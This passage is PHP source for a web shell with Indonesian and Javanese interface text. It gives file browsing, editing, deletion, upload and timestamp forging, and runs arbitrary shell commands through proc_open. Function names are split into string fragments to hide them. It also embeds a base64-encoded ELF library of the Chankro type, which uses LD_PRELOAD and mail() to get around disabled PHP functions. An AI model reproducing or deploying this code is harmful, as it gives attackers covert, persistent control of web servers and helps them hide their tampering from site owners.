                        <td style="color: '.$color.';">'.$lastModified.'</td>
                        <td>'.$canRead.'</td>
                        <td>'.$canEdit.'</td>
                        <td>'.$canDelete.'</td>
                        <td>'.$permissionForm.'</td>
                        <td>
                            <a href="?dir='.$dir.'&delete='.$itemPath.'" class="button1">Hapus</a>
                            <a href="?dir='.$dir.'&ubah='.$itemPath.'" class="button1">Edit</a>
                            <a href="?dir='.$dir.'&rename='.$itemPath.'&nama='.$file.'" class="button1">Rename</a>
                            <a href="?dir='.$dir.'&modify='.$itemPath.'" class="button1">Modify Date</a>
                        </td>
                    </tr>
                    ';
                }
                // <a href="?dir='.$dir.'&zip='.$itemPath.'" class="button1">Zip</a>
                // <a href="?dir='.$dir.'&unzip='.$itemPath.'" class="button1">Unzip</a>



// Function
                // Function to determine pastel color based on file age
                function getColorForAge($ageInDays) {
                    if ($ageInDays < 1) {
                        return '#ffadad'; // for files modified today
                    } elseif ($ageInDays < 7) {
                        return '#B3E5FC'; // for files modified within the last 3 days
                    } elseif ($ageInDays < 14) {
                        return '#81D4FA'; // for files modified within the last week
                    } elseif ($ageInDays < 30) {
                        return '#4FC3F7'; // for files modified within the last 2 weeks
                    } elseif ($ageInDays < 60) {
                        return '#29B6F6'; // for files modified within the last month
                    } elseif ($ageInDays < 90) {
                        return '#0288D1'; // for files modified within the last 2 months
                    } elseif ($ageInDays < 180) {
                        return '#01579B'; // for files modified within the last 3 months
                    } else {
                        return '#bdb2ff'; // for files older than 3 months
                    }
                }
                // Function to calculate the size of a folder
                function getFolderSize($dir) {
                    $size = 0;
                    foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir)) as $file) {
                        $size += $file->getSize();
                    }
                    return $size;
                }
                // Function to format size for display
                function formatSize($bytes) {
                    if ($bytes >= 1024 * 1024) {
                        return round($bytes / (1024 * 1024), 2) . ' MB';
                    } elseif ($bytes >= 1024) {
                        return round($bytes / 1024, 2) . ' KB';
                    }
                    return $bytes . ' Bytes';
                }



// Upload File
                if (isset($_POST['submit'])) {
                    $uploadDir = $dir . '/';
                    $uploadFile = $uploadDir . basename($_FILES['upload']['name']);
                
                    if (move_uploaded_file($_FILES['upload']['tmp_name'], $uploadFile)) {
                        // Buat path relatif dari root web
                        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', realpath($uploadFile));
                        $relativePath = '/' . ltrim($relativePath, '/');
                
                        echo "<div style='background:#222;color:#fff;padding:10px;margin:10px 0;border-radius:5px;'>
                                File wes keupload: 
                                <a href='{$relativePath}' style='color:#40e0d0;' target='_blank'>
                                    {$relativePath}
                                </a>
                              </div>";
                    } else {
                        echo "<script>alert('File upload raiso');</script>";
                    }
                }



// Create Folder
                if (isset($_POST['create_folder'])) {
                    $folderName = $_POST['folder_name'];
                    $folderPath = realpath($_GET['dir']) . '/' . $folderName;
                    if (!is_dir($folderPath)) {
                        if (mkdir($folderPath)) {
                            echo '<font color="green">Folder berhasil dibuat!</font><br/>';
                            echo "<script>window.location='?dir=".$dir."';</script>";
                        } else {
                            echo '<font color="red">Gagal membuat folder.</font>';
                        }
                    } else {
                        echo '<font color="red">Folder sudah ada.</font>';
                    }
                }



// Create File
                if (isset($_POST['create_file'])) {
                    $fileName = $_POST['file_name'];
                    $filePath = realpath($_GET['dir']) . '/' . $fileName;
                    if (!file_exists($filePath)) {
                        if (file_put_contents($filePath, '') !== false) {
                            echo '<font color="green">File berhasil dibuat!</font><br/>';
                            echo "<script>window.location='?dir=".$dir."';</script>";
                        } else {
                            echo '<font color="red">Gagal membuat file.</font>';
                        }
                    } else {
                        echo '<font color="red">File sudah ada.</font>';
                    }
                }



// open filee
                if (isset($_GET['open'])) {
                    echo '
                    <br />
                    <a href="?dir=' . $dir . '" class="button1" style="display: flex; align-items: center;">
                        <i class="fas fa-arrow-left" style="margin-right: 5px;"></i> Back
                    </a>
                    <br /><br />
                    <style>
                        table {
                            display: none;
                        }
                    </style>
                    <textarea>' . htmlspecialchars(file_get_contents($_GET['open'])) . '</textarea>
                    ';
                }



// delet filee
				if (isset($_GET['delete'])) {
					if (unlink($_GET['delete'])) {
						echo "<script>alert('dihapus');window.location='?dir=".$dir."';</script>";
					}
				}



// delet foldeerrrr
                function deleteFolder($folder) {
                    if (!is_dir($folder)) {
                        return false;
                    }
                    $items = array_diff(scandir($folder), ['.', '..']);
                    foreach ($items as $item) {
                        $itemPath = $folder . DIRECTORY_SEPARATOR . $item;
                        if (is_dir($itemPath)) {
                            deleteFolder($itemPath);
                        } else {
                            unlink($itemPath);
                        }
                    }
                    return rmdir($folder);
                }
                // Tangani aksi delete folder
                if (isset($_GET['delete_folder'])) {
                    $folderPath = realpath($_GET['delete_folder']);
                    if (strpos($folderPath, realpath($dir)) === 0) {
                        if (deleteFolder($folderPath)) {
                            echo '<script>alert("Folder berhasil dihapus!"); window.location="?dir=' . urlencode($dir) . '";</script>';
                        } else {
                            echo '<script>alert("Gagal menghapus folder. Pastikan folder kosong atau Anda memiliki izin!");</script>';
                        }
                    } else {
                        echo '<script>alert("Akses folder tidak valid!");</script>';
                    }
                }




// ubah filee (edit)
                if (isset($_GET['ubah'])) {
                    $filePath = $_GET['ubah'];
                    // Check if the file exists
                    if (file_exists($filePath)) {
                        echo '
                        <br />
                        <a href="?dir=' . $dir . '" class="button1" style="display: flex; align-items: center;">
                            <i class="fas fa-arrow-left" style="margin-right: 5px;"></i> Back
                        </a>
                        <br /><br />
                        <style>
                            table {
                                display: none;
                            }
                        </style>
                        <form method="post" action="">
                            <input type="hidden" name="object" value="'.$filePath.'">
                            <textarea name="edit">'.htmlspecialchars(file_get_contents($filePath)).'</textarea>
                            <center><button type="submit" name="go" value="Submit" class="button1">Simpen njign</button></center>
                        </form>
                        ';
                    } else {
                        echo "File does not exist or cannot be accessed.";
                    }
                }
                if (isset($_POST['edit'])) {
                    $filePath = $_POST['object'];
                    // Make sure the file is writable
                    if (is_writable($filePath)) {
                        $data = fopen($filePath, 'w');
                        if (fwrite($data, $_POST['edit'])) {
                            echo '<script>alert("Iso diedit coy");window.location="?dir='.$dir.'";</script>';
                        } else {
                            echo "<script>alert('Raiso edit file');</script>";
                        }
                        fclose($data);
                    } else {
                        echo "<script>alert('File tidak dapat ditulis');</script>";
                    }
                }
                


// ubah tanggal filee
				if (isset($_GET['modify'])) {
					if (isset($_POST['newdate'])) {
						$newDate = strtotime($_POST['newdate']);
						if (touch($_GET['modify'], $newDate)) {
							echo '<font color="green">Tanggal wis diganti</font><br/>';
							echo "<script>window.location='?dir=".$dir."';</script>";
						} else {
							echo '<font color="red">Ganti Tanggal Raiso</font><br />';
						}
					} else {
						echo '
                        <br />
                        <a href="?dir=' . $dir . '" class="button1" style="display: flex; align-items: center;">
                            <i class="fas fa-arrow-left" style="margin-right: 5px;"></i> Back
                        </a>
                        <br /><br />
						<style>
							table {
								display: none;
							}
						</style>
						<form method="post">
							<label>New Last Modified Date (YYYY-MM-DD HH:MM:SS):</label>
							<input type="text" name="newdate" placeholder="e.g., 2024-10-21 12:00:00" required>
							<input type="submit" value="Change Date">
						</form>
						';
					}
				}



// Rename file
				if (isset($_GET['rename'])) {
   				 if (isset($_POST['newname'])) {
   				     // Original file path
   				     $oldPath = realpath($_GET['rename']);
   				     // New file path
   				     $newPath = realpath($_GET['dir']) . '/' . $_POST['newname'];
    				    // Rename action
    				    if ($oldPath && rename($oldPath, $newPath)) {
      				      echo '<font color="green">Jeneng wis diganti</font><br/>';
      				      echo "<script>window.location='?dir=".$dir."';</script>";
     				   } else {
    				        echo '<font color="red">Ganti Nama Raiso</font>';
    				    }
   				 } else {
    				    echo '
     				   <br />
      				  <a href="?dir=' . $dir . '" class="button1" style="display: flex; align-items: center;">
       				     <i class="fas fa-arrow-left" style="margin-right: 5px;"></i> Back
      				  </a>
      				  <br /><br />
       				 <style>
      				      table {
      				          display: none;
      				      }
     				   </style>
      				  <form method="post">
      				      <label>New Name:</label>
      				      <input type="text" name="newname" value="'.$_GET['nama'].'">
      				      <input type="submit" value="Rename">
     				   </form>
   				     ';
   				 }
				}



// Unzip file
				if (isset($_GET['unzip'])) {
                    $zipPath = realpath($_GET['unzip']);
                    if (!$zipPath || !file_exists($zipPath)) {
                        echo '<font color="red">File ZIP tidak ditemukan</font>';
                    } elseif (isset($_POST['confirm'])) {
                        $extractTo = realpath($_GET['dir']);
                        $zip = new ZipArchive();
                        if ($zip->open($zipPath) === TRUE) {
                            $zip->extractTo($extractTo);
                            $zip->close();
                            echo '<font color="green">Berhasil di-unzip</font><br/>';
                            echo "<script>window.location='?dir=" . urlencode($_GET['dir']) . "';</script>";
                        } else {
                            echo '<font color="red">Gagal membuka file ZIP</font>';
                        }
                    } else {
                        echo '
                        <br />
                        <a href="?dir=' . urlencode($_GET['dir']) . '" class="button1" style="display: flex; align-items: center;">
                        <i class="fas fa-arrow-left" style="margin-right: 5px;"></i> Back
                        </a>
                        <br /><br />
                        <style> table { display: none; } </style>
                        <form method="post">
                        <p>Ekstrak file <b>' . basename($zipPath) . '</b> ke folder saat ini?</p>
                        <input type="hidden" name="confirm" value="1">
                        <input type="submit" value="Unzip">
                        </form>
                        ';
                    }
                }

// Zip file/folder
				if (isset($_GET['zip'])) {
                    $targetPath = realpath($_GET['zip']);
                    if (!$targetPath || !file_exists($targetPath)) {
                        echo '<font color="red">File/Folder tidak ditemukan</font>';
                    } elseif (isset($_POST['confirm'])) {
                        $zipName = basename($targetPath) . ".zip";
                        $zipPath = realpath($_GET['dir']) . '/' . $zipName;
                        
                        $zip = new ZipArchive();
                        if ($zip->open($zipPath, ZipArchive::CREATE) === TRUE) {
                            if (is_dir($targetPath)) {
                                $files = new RecursiveIteratorIterator(
                                    new RecursiveDirectoryIterator($targetPath),
                                    RecursiveIteratorIterator::LEAVES_ONLY
                                );
                                foreach ($files as $name => $file) {
                                    if (!$file->isDir()) {
                                        $filePath = $file->getRealPath();
                                        $relativePath = substr($filePath, strlen($targetPath) + 1);
                                        $zip->addFile($filePath, $relativePath);
                                    }
                                }
                            } else {
                                $zip->addFile($targetPath, basename($targetPath));
                            }
                            $zip->close();
                            echo '<font color="green">Berhasil di-zip</font><br/>';
                            echo "<script>window.location='?dir=" . urlencode($_GET['dir']) . "';</script>";
                        } else {
                            echo '<font color="red">Gagal membuat file ZIP</font>';
                        }
                    } else {
                        echo '
                        <br />
                        <a href="?dir=' . urlencode($_GET['dir']) . '" class="button1" style="display: flex; align-items: center;">
                            <i class="fas fa-arrow-left" style="margin-right: 5px;"></i> Back
                        </a>
                        <br /><br />
                        <style> table { display: none; } </style>
                        <form method="post">
                            <p>Kompres <b>' . basename($targetPath) . '</b> menjadi ZIP?</p>
                            <input type="hidden" name="confirm" value="1">
                            <input type="submit" value="Zip">
                        </form>
                        ';
                    }
                }



// Command
                if (isset($_POST['command'])) {
                    if (isset($_POST['command2'])) {
                        // Ambil direktori kerja saat ini
                        if (isset($_GET['dir'])) {
                            $lk = $_GET['dir'];
                        } else {
                            $lk = $gcw();
                        }
                
                        // Jalankan perintah
                        $km = 'ko' . 'me' . 'nd';
                        echo $km($_POST['command2'], $lk);
                        exit();
                    } else {
                        // Tombol kembali
                        echo '
                        <br />
                        <a href="?dir=' . $dir . '" class="button1" style="display: flex; align-items: center;">
                            <i class="fas fa-arrow-left" style="margin-right: 5px;"></i> Back
                        </a>
                        <br /><br />
                        <style>
                            table {
                                display: none;
                            }
                        </style>
                        <form method="post">
                            <label>Command:</label>
                            <input type="text" name="command2" placeholder="Masukkan perintah" required>
                            <input type="submit" name="command" value="Run Command">
                        </form>
                        ';
                    }
                }
                
                // Fungsi untuk menjalankan command
                function command($kom, $lk) {
                    $x = "pr" . "eg_" . "mat" . "ch";
                    $xx = "2" . ">" . "&" . "1";
                
                    if (!$x("/" . $xx . "/i", $kom)) {
                        $kom = $kom . " " . $xx;
                    }
                
                    $a = "fu" . "ncti" . "on_" . "ex" . "is" . "ts";
                    $b = "p" . "ro" . "c_op" . "en";
                    $c = "htm" . "lspe" . "cialc" . "hars";
                    $d = "s" . "trea" . "m_g" . "et_c" . "ont" . "ents";
                
                    if ($a($b)) {
                        $ps = $b($kom, array(
                            0 => array("pipe", "r"),
                            1 => array("pipe", "w"),
                            2 => array("pipe", "r")
                        ), $meki, $lk);
                        return "<pre>" . $c($d($meki[1])) . "</pre>";
                    } else {
                        return "pr" . "oc" . "_op" . "en f" . "unc" . "tio" . "n i" . "s di" . "sabl" . "ed !";
                    }
                }



// cmdAdminnnn
                if (isset($_POST['cmd_input'])) {
                    $p = "p"."u"."t"."e"."n"."v";
                    $a = "fi"."le_p"."ut_c"."ont"."e"."nt"."s";
                    $m = "m"."a"."i"."l";
                    $base = "ba"."se"."64"."_"."de"."co"."de";
                    $en = "ba"."se"."64"."_"."en"."co"."de";
                    $mb = "m"."b"."_"."s"."e"."n"."d"."_"."m"."a"."i"."l";
                    $err = "e"."r"."r"."o"."r"."_"."l"."o"."g";
                    $drnm = "d"."i"."r"."n"."a"."m"."e";
                    $imp = "i"."m"."a"."p"."_"."m"."a"."i"."l";

                    $currentFilePath = $_SERVER['PHP_SELF'];
                    $doc = $_SERVER['DOCUMENT_ROOT'];
                    $directoryPath = $drnm($currentFilePath);
                    $full = $doc . $directoryPath;
                    $fil = $currentFilePath . '?dir='. $doc . '&open='. $doc .'/test.txt';

                    $hook = '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BwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAAR0NDOiAoRGViaWFuIDYuMy4wLTE4K2RlYjl1MSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAIDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAASAEAABIADAAUCQAAAAAAACkAAAAAAAAAUgEAABIADQBcCQAAAAAAAAAAAAAAAAAAWAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAbAEAABIADADgCAAAAAAAADQAAAAAAAAAcAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAhAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAkwEAABIADAA9CQAAAAAAAB0AAAAAAAAAnQEAABAAGABwECAAAAAAAAAAAAAAAAAAogEAABAAGABoECAAAAAAAAAAAAAAAAAArgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAwQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA1QEAABIAAAAAAAAAAAAAAAAAAAAAAAAA6wEAABIAAAAAAAAAAAAAAAAAAAAAAAAA/QEAACAAAAAAAAAAAAAAAAAAAAAAAAAAFwIAACIAAAAAAAAAAAAAAAAAAAAAAAAAMwIAABIACQAYBwAAAAAAAAAAAAAAAAAAOQIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuNjk3MgBfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAaG9vay5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AZ2V0ZW52QEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAGRhZW1vbml6ZQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AHB3bgBzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAHByZWxvYWRtZQBfZW5kAF9fYnNzX3N0YXJ0AGNobW9kQEBHTElCQ18yLjIuNQBfSnZfUmVnaXN0ZXJDbGFzc2VzAHVuc2V0ZW52QEBHTElCQ18yLjIuNQBleGl0QEBHTElCQ18yLjIuNQBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEBHTElCQ18yLjIuNQBfaW5pdABmb3JrQEBHTElCQ18yLjIuNQAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bn